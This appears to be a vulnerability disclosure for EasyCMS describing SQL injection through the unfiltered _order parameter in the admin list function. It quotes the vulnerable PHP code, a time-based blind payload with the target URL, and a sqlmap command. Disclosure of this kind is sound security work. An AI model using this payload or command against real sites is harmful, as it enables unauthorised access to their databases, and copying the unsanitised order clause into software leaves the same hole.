# EasyCMS's background query function SQL injection vulnerability(new)

1.The following code has SQL injection:

vulnerability found in:
    \App\Modules\Admin\Action\ArticlemAction.class.php line 390 function _list
   
		$list = $model->where($map)->relation(true)->order($order.' '.$sort)
						->limit($p->firstRow.','.$p->listRows)
						->select();			
		if (method_exists($this, '_tigger_list')) {
			$this->_tigger_list($list);
		}
		foreach ($map as $key => $val) {
			if (!is_array($val)) {
				$p->parameter .= "$key=" . urlencode($val) . "&";
			}
		}

![图片](https://user-images.githubusercontent.com/90664154/149264230-11e0c622-8903-4d8e-af35-d95d0e76aac7.png)

The variable Order is not filtered and SQL injection exists.

Web sample:
![图片](https://user-images.githubusercontent.com/90664154/149264421-d0bb1b16-72e3-45f4-8c45-f9f7964336d0.png)


2.Payload
URL:/index.php?s=/admin/user/index.html

Payload: _order=123 AND (SELECT 8561 FROM (SELECT(SLEEP(5)))MlTU)&keyword=123&numPerPage=10&pageNum=1

Parameter: _order (POST)

Type: time-based blind

sqlmap command:
python sqlmap.py -r easycms.txt -batch

result:
![图片](https://user-images.githubusercontent.com/90664154/149264277-a720fa3e-c1d2-4184-aabf-a637bb3138ad.png)


